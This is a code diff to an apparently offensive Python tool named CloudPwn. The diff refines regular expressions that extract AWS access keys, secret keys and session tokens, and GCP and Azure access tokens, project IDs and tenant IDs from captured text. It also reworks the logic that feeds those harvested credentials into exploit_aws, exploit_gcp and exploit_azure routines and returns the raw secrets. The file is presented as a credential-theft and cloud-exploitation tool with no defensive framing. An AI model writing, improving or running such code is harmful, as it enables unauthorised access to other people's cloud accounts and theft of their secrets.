@@ -12,8 +12,8 @@ logger = get_logger("cloud_pwn")
 
 AWS_ROLE_ARN_RE = re.compile(r"arn:aws:iam::\d+:role/\S+")
 AWS_ACCESS_KEY_RE = re.compile(r"(?i)(AccessKeyId|SecretAccessKey|SessionToken)\s*[:=]\s*['\"]?(\S+?)['\"]?[\s,\n\r\]]")
-GCP_TOKEN_RE = re.compile(r"(?i)(access_token)\s*[:=]\s*['\"]?(\S+?)['\"]?")
-AZURE_TOKEN_RE = re.compile(r"(?i)(access_token)\s*[:=]\s*['\"]?(\S+?)['\"]?")
+GCP_TOKEN_RE = re.compile(r"(?i)(access_token)[\s:=]*['\"]?([^\s'\",;]+)")
+AZURE_TOKEN_RE = re.compile(r"(?i)(access_token)[\s:=]*['\"]?([^\s'\",;]+)")
 SUBNET_RE = re.compile(r"subnet-[\da-f]+")
 VPC_RE = re.compile(r"vpc-[\da-f]+")
 S3_BUCKET_RE = re.compile(r"(\S+\.s3\.amazonaws\.com|\S+\.s3-website-\S+)")
@@ -26,16 +26,16 @@ def parse_aws_credentials(text: str) -> Dict:
     role_match = AWS_ROLE_ARN_RE.search(text)
     if role_match:
         creds["role_arn"] = role_match.group(0)
-    access_key = re.search(r"(?i)AccessKeyId\s*['\"]?(\S+)['\"]?", text)
+    access_key = re.search(r"(?i)AccessKeyId[\s:=]*['\"]?([^\s'\",;]+)", text)
     if access_key:
         creds["access_key_id"] = access_key.group(1).strip().rstrip(",")
-    secret_key = re.search(r"(?i)SecretAccessKey\s*['\"]?(\S+)['\"]?", text)
+    secret_key = re.search(r"(?i)SecretAccessKey[\s:=]*['\"]?([^\s'\",;]+)", text)
     if secret_key:
         creds["secret_access_key"] = secret_key.group(1).strip().rstrip(",")
-    session_token = re.search(r"(?i)SessionToken\s*['\"]?(\S+)['\"]?", text)
+    session_token = re.search(r"(?i)SessionToken[\s:=]*['\"]?([^\s'\",;]+)", text)
     if session_token:
         creds["session_token"] = session_token.group(1).strip().rstrip(",")
-    region = re.search(r"(?i)Region\s*['\"]?(\S+)['\"]?", text)
+    region = re.search(r"(?i)Region[\s:=]*['\"]?([^\s'\",;]+)", text)
     if region:
         creds["region"] = region.group(1).strip().rstrip(",")
     return creds
@@ -43,10 +43,10 @@ def parse_aws_credentials(text: str) -> Dict:
 
 def parse_gcp_credentials(text: str) -> Dict:
     creds = {}
-    token = re.search(r"(?i)access_token\s*['\"]?(\S+?)['\"]?", text)
+    token = re.search(r"(?i)access_token[\s:=]*['\"]?([^\s'\",;]+)", text)
     if token:
         creds["access_token"] = token.group(1).rstrip(",")
-    project = re.search(r"(?i)project[_\s]?id\s*['\"]?(\S+?)['\"]?", text)
+    project = re.search(r"(?i)project[_\s]?id[\s:=]*['\"]?([^\s'\",;]+)", text)
     if project:
         creds["project_id"] = project.group(1).rstrip(",")
     return creds
@@ -54,10 +54,10 @@ def parse_gcp_credentials(text: str) -> Dict:
 
 def parse_azure_credentials(text: str) -> Dict:
     creds = {}
-    token = re.search(r"(?i)access_token\s*['\"]?(\S+?)['\"]?", text)
+    token = re.search(r"(?i)access_token[\s:=]*['\"]?([^\s'\",;]+)", text)
     if token:
         creds["access_token"] = token.group(1).rstrip(",")
-    tenant = re.search(r"(?i)tenant[_\s]?id\s*['\"]?(\S+?)['\"]?", text)
+    tenant = re.search(r"(?i)tenant[_\s]?id[\s:=]*['\"]?([^\s'\",;]+)", text)
     if tenant:
         creds["tenant_id"] = tenant.group(1).rstrip(",")
     return creds
@@ -157,13 +157,19 @@ class CloudPwn:
             result = self.exploit_aws(aws_creds)
             result["raw_creds"] = {k: (v[:20] + "...") if len(v) > 20 else v for k, v in aws_creds.items() if v}
             return result
-        if gcp_creds.get("access_token"):
+        if gcp_creds.get("access_token") and gcp_creds.get("project_id"):
             result = self.exploit_gcp(gcp_creds)
             result["raw_creds"] = gcp_creds
             return result
-        if azure_creds.get("access_token"):
+        if azure_creds.get("access_token") and (
+                azure_creds.get("tenant_id")
+                or str(azure_creds.get("access_token", "")).startswith("eyJ")):
             result = self.exploit_azure(azure_creds)
             result["raw_creds"] = azure_creds
+            return result
+        if gcp_creds.get("access_token"):
+            result = self.exploit_gcp(gcp_creds)
+            result["raw_creds"] = gcp_creds
             return result
         return {"provider": cloud_hint or "unknown", "success": False, "error": "No usable cloud credentials found"}
 
